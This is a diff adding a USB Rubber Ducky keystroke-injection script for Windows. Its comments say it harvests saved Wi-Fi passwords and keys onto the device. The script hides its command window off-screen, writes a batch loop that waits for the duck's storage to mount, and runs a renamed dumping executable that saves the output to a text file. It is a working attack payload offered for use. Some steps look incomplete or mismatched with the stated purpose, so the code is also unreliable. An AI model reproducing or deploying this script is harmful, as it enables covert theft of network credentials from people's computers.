@@ -1,0 +1,53 @@
+REM --> Auth- eliddell
+REM --> for use with TwinDuck on windows 7+
+REM --> This duck will take all saved wireless networks and save their info including passwords/keys, to a text file on your duck
+DEFAULT_DELAY 75
+WINDOWS d
+DELAY 10000
+GUI r
+DELAY 500
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+DELAY 500
+ENTER
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat contents
+STRING :while1
+ENTER
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "_"') do set myd=%%d
+ENTER
+STRING if Exist %myd% (
+ENTER
+STRING goto break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto while1
+ENTER
+STRING :break
+ENTER
+REM 
+REM once mounted switch to ducky dir for ease of dumping log to txt
+STRING %myd%
+ENTER
+DELAY 500
+STRING start historygame.exe /stext historygame.txt
+ENTER
+
